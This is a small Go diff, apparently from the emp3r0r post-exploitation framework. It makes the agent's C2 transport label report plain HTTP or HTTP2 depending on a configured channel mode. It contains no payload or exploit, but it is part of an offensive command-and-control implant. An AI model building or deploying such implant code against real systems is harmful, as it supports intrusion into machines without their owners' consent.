@@ -9,6 +9,7 @@ import (
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
 	"github.com/jm33-m0/emp3r0r/core/internal/def"
 	"github.com/jm33-m0/emp3r0r/core/lib/netutil"
+	"strings"
 )
 
 // set C2Transport string
@@ -37,6 +38,11 @@ func genC2TransportString() (transport_str string) {
 
 		return fmt.Sprintf("Proxy %s", common.RuntimeConfig.C2TransportProxy)
 	} else {
+		mode := strings.ToLower(common.RuntimeConfig.C2ChannelMode)
+		if mode == "plain_http" {
+			return fmt.Sprintf("HTTP (%s)", def.CCAddress)
+		}
+		// Default to HTTP2 for h2conn or unknown modes
 		return fmt.Sprintf("HTTP2 (%s)", def.CCAddress)
 	}
 }
